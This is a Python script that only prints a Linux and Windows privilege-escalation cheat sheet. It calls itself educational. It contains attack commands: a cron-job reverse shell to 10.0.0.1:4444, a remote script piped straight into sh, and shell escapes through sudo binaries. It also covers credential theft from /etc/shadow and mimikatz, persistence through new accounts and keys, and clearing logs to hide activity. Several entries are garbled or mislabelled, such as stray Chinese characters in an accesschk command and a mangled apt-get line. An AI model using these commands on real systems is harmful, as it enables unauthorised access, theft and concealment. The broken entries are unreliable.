#!/usr/bin/env python3
"""
Privilege Escalation Framework - Project 52
Linux and Windows privilege escalation techniques.

EDUCATIONAL USE ONLY. Only use on systems you own or have permission to test.
"""

import os
import sys

def main():
    print("""
╔════════════════════════════════════════════════════════════════╗
║     Privilege Escalation Framework - Project 52               ║
║                                                                ║
║     EDUCATIONAL USE ONLY                                       ║
║     Only use on systems you own or have permission to test    ║
╚════════════════════════════════════════════════════════════════╝

LINUX PRIVILEGE ESCALATION:

ENUMERATION:

# System info
uname -a
cat /etc/lsb-release
hostname

# Current user
whoami
id
sudo -l

# Users and groups
cat /etc/passwd
cat /etc/group
groups

# SUID files (often vulnerable)
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Scheduled tasks
ls -la /etc/cron*
cat /etc/crontab
ls -la /var/spool/cron/

# World-writable files
find / -writable -type f 2>/dev/null | head -50

COMMON PRIVESC VECTORS:

1. SUDO MISCONFIGURATION
   - sudo -l (what can we run?)
   - GTFOBins (gtfobins.github.io)
   
   # Examples:
   sudo apt-get update - alternative -> /bin/sh
   sudo find . -exec whoami \\; - interactive mode
   sudo vim -c '!sh' - escape vim
   sudo less - '!whoami' - escape less
   sudo man man - '!whoami' - escape man

2. SUID BIT MISUSE
   - Find SUID binaries
   - Check GTFOBins for exploits
   
   # nmap example (has SUID)
   sudo nmap --interactive
   !sh

3. CRON JOBS
   - Check for writable scripts in cron
   - Replace with reverse shell
   
   # Look for:
   */5 * * * * /opt/scripts/backup.sh
   
   # If backup.sh is writable:
   #!/bin/bash
   bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

4. KERNEL EXPLOITS
   - Check kernel version
   - Search for exploits (exploit-db, linux-exploit-suggester)
   
   # Example:
   uname -r
   # 3.2.0-23-generic -> CVE-2012-0056 (mempodipper)

5. CAPABILITIES EXPLOITATION
   - python capability (can spawn shell as sudo)
   - python -c 'import os; os.system("/bin/bash")'

6. NFS ROOT SQUASHING
   - Check /etc/exports for NFS shares
   - If no_root_squash, mount and create SUID

LINPRIVESC TOOLS:

# Linux Exploit Suggester
perl linux-exploit-suggester.pl

# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20230119/linpeas.sh | sh

# pspy (process monitoring)
./pspy64

# LinEnum
./LinEnum.sh -s -k kernel

WINDOWS PRIVILEGE ESCALATION:

ENUMERATION:

# System info
systeminfo
hostname
echo %USERNAME%

# patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Network
net config workstation
netstat -ano

# Services
sc query
sc qc <service>

# Users and groups
net user
net localgroup administrators

# Scheduled tasks
schtasks /query /fo LIST /v

# AutoRuns
wmic startup list full
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

COMMON WINDOWS PRIVESC VECTORS:

1. MISSING PATCHES
   - Check wmic qfe
   - Search for exploits based on KB numbers
   - Use watson, winpeas

2. SERVICE MISCONFIGURATIONS
   # Check for weak service permissions
   accesschk.exe -uwcqv "Authenticated Users" *

   # If service runs as SYSTEM and is writable:
   # Modify binary path to your payload

3. UNQUOTED SERVICE PATHS
   # If path is \"C:\\Program Files\\My Program\\file.exe\"
   # Can place malicious exe in subfolder
   
   sc qc <service>
   # If binary path has spaces and is unquoted -> attack!

4. REGISTRY AUTORUNS
   # Check for writable autorun entries
   reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

5. ALWAYS INSTALL ELEVATED MSI
   # If MSI always runs as SYSTEM

6. SEIMPERSONATE (Rotten Potato)
   # If token has SeImpersonatePrivilege
   # Can get SYSTEM token via NTLM relay

WINDOWS PRIVESC TOOLS:

# WinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20230119/winpeas.exe -o winpeas.exe

# PowerUp
powershell -ExecutionPolicy Bypass -File PowerUp.ps1

# Watson
powershell -ExecutionPolicy Bypass -File Watson.ps1

# accesschk
./accesschk.exe -uwcqv "Everyone" *

ACCESSCHK:
accesschk.exe -acls什么东西s <file>
accesschk.exe -wcuqv <user> <service>

PRIVESC CHECKLIST:

[ ] SUID/SGID files
[ ] Sudo -l results
[ ] Cron jobs
[ ] Kernel version
[ ] Capabilities
[ ] Writable services
[ ] Missing patches
[ ] Unquoted paths
[ ] Registry autoruns
[ ] AlwaysInstallElevated

FOLLOW-UP AFTER PRIVESC:

1. Confirm root/SYSTEM
   whoami (should be root or SYSTEM)
   
2. Gather credentials
   - cat /etc/shadow (if root)
   - mimikatz (if Windows SYSTEM)
   - password reuse hunting
   
3. Maintain access
   - Add new user
   - Add SSH key
   - Create service
   - Scheduled task

4. Clean up
   - Remove exploits
   - Clear logs
   - Restore original files

""")

if __name__ == "__main__":
    main()